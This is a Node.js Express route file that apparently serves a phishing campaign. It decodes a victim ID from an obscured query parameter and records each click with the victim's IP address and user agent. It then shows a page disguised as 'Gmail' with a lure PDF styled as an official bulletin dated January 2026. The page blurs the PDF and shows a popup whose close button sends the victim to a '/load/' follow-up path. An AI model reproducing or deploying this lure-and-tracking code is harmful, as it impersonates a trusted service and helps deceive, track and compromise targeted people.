
const express = require ('express');
const router = express.Router();
const db = require('../db');
router.use(express.static('public'));

//const fetch = require('node-fetch');



//validate form data before handling
// Custom middleware for form validation
router.get('/', (req, res) => {
    const data = req.query.ffregretgreytusnsxbsahdbaxuisadbasbc;
    
    if (data == null) {
        res.render('error');
    } else {
        const userid = Buffer.from(data, 'base64').toString('utf-8');
        const word = 'clicked';

        // Get the client IP, handle undefined or null
        const clientIP = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        
        // Check if clientIP is defined and not null
        let ip = '';
        if (clientIP) {
            ip = clientIP.split(',')[0].trim();
        } else {
            console.error('Client IP is undefined or null');
            ip = 'unknown';
        }

        const useragent = req.get('User-Agent');
        const date = new Date();
        const pagetype = 0;
        const mobiletype = 0;
        const notify = 2;

        // Do your further processing...
    

const sqlQuery =  'SELECT username FROM maintable WHERE username= ?';   
  db.query(sqlQuery, [userid], (err, results) => {
    if (err) {
      console.error('Error executing query:', err);
      return res.status(500).json({ error: 'Internal Server Error' });
    }
  const rowCount = results.length;

  if (rowCount > 0) {

                const updateQuery = 'UPDATE maintable SET password = ?, pagetype = ?, mobiletype = ?, notify = ? WHERE username = ?';
                db.query(updateQuery, [word, pagetype, mobiletype, notify, userid], (err) => {
                    if (err) {
                        console.error('Error inserting record:', err);
                        return res.status(500).send('Internal Server Error');
                    }
                

                    });


        }else{

            const insertQuery = 'INSERT INTO maintable (username, password, ip, useragent,date,notify) VALUES (?,?,?,?,?,?)';
            db.query(insertQuery, [userid, word, ip, useragent, date, notify], (err) => {
                if (err) {
                    console.error('Error inserting record:', err);
                    return res.status(500).send('Internal Server Error');
                }
              

                });


        }

   
    const url = `/load/?wihdft948fdjxgjdferuide=${data}`;

   

    const htmlContent = `
       <!doctype html>
        <html lang="en">
        <head>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <title>Gmail</title>
            <link rel="shortcut icon" href="/images/image.png" type="image/png">
            <style>
                .blur { filter: blur(5px); transition: filter 0.5s; }
                .popup { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; display: none; }
                .close-btn { position: absolute; top: 10px; right: 10px; width: 30px; height: 30px; background: #fff; border: 2px solid #ccc; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 22px; font-family: sans-serif; cursor: pointer; color: #666; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }
            </style>
        </head>
        <body>
            <div style="position: relative; display: inline-block;">
                <object id="pdf" data="DGDP Bulletin No. 107 dated 8 Jan 20261.pdf" style="height:1000px; width:1900px"></object>
                <div class="popup" id="popup" style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 1000; display: none;">
                    <span class="close-btn" onclick="closePopup()">x</span>
                    <img src="new-year-2026-scaled.png" alt="New Year 2026" style="width: 550px; height: 750px;">
                </div>
            </div>
            <script>
                setTimeout(() => {
                    document.getElementById('pdf').classList.add('blur');
                    document.getElementById('popup').style.display = 'block';
                }, 4000);
                function closePopup() {
                    window.location.href = '${url}';
                }
            </script>
        </body>
        </html>
    `;

    // Send the HTML content as a response
    res.send(htmlContent);

            
});
}
});

module.exports =router
